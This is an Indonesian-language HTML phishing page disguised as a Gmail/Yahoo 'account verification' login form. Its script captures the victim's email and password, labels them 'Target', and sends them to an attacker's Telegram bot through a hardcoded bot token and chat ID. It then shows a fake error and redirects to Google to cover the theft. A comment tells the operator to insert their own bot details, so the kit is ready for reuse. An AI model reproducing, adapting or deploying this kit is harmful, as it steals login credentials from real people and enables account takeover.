<!DOCTYPE html>
<html>
<head>
    <title>Security Verification | Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background: #f2f2f2; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .box { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 320px; text-align: center; }
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>
    <div class="box">
    <img src="https://www.pngkey.com/png/detail/267-2672335_logo-kepala-garuda-keren.png" width="120">


        <h2>Verifikasi Akun</h2>
        <input type="email" id="email" placeholder="Email (Gmail/Yahoo)" required>
        <input type="password" id="pass" placeholder="Kata Sandi" required>
        <button onclick="kirimData()">Berikutnya</button>
    </div>

    <script>
        function kirimData() {
            const email = document.getElementById("email").value;
            const pass = document.getElementById("pass").value;
            
            // MASUKKAN DATA KAMU DI SINI!
            const token = "8656614533:AAGHCLdmRtOfOLfSGZUHJcFu76OL0cVnF8U"; 
            const chatid = "8778681440"; 
             

            if (email.includes("@") && pass.length > 5) {
                var pesan = "Target: " + email + " | Pass: " + pass;


  const url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chatid + "&text=" + pesan;


                // Proses pengiriman data secara otomatis
                fetch(url).then(() => {
                    alert("Verifikasi Gagal! Sesi Anda berakhir. Silakan login kembali.");
                    window.location.href = "https://google.com";
                }).catch(() => {
                    alert("Koneksi tidak stabil, coba lagi!");
                });
            } else {
                alert("Masukkan data yang benar!");
            }
        }
    </script>
</body>
</html>
